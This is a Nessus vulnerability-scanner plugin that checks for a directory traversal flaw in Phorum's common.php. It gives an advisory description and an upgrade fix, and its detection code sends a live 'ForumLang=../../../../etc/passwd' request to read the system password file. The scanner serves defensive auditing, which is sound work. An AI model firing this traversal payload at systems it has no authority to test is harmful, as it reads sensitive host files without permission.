#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10593);
 script_bugtraq_id(1997);
 script_version ("$Revision: 1.18 $");
 name["english"] = "phorum's common.php";
 name["francais"] = "phorum's common.php";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that suffers from an
information disclosure flaw. 

Description :

The version of Phorum installed on the remote host lets an attacker
read arbitrary files on the affected host with the privileges of the
http daemon because it fails to filter input to the 'ForumLang'
parameter of the 'support/common.php' script of directory traversal
sequences. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2000-11/0338.html
http://marc.theaimsgroup.com/?l=phorum-announce&m=97500921223488&w=2

Solution : 

Upgrade to Phorum 3.2.8 or later. 

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of Phorum's common.php";
 summary["francais"] = "Vérifie la présence de common.php de Phorum";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("phorum_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(prefix)
{
  req = http_get(item:string(prefix, "?f=0&ForumLang=../../../../../../../etc/passwd"),
  		 port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)) {
  	security_note(port);
	exit(0);
	}
}

# Test an install.
install = get_kb_item(string("www/", port, "/phorum"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  check(prefix:string(dir, "/support/common.php"));
  check(prefix:string(dir, "/common.php"));
}
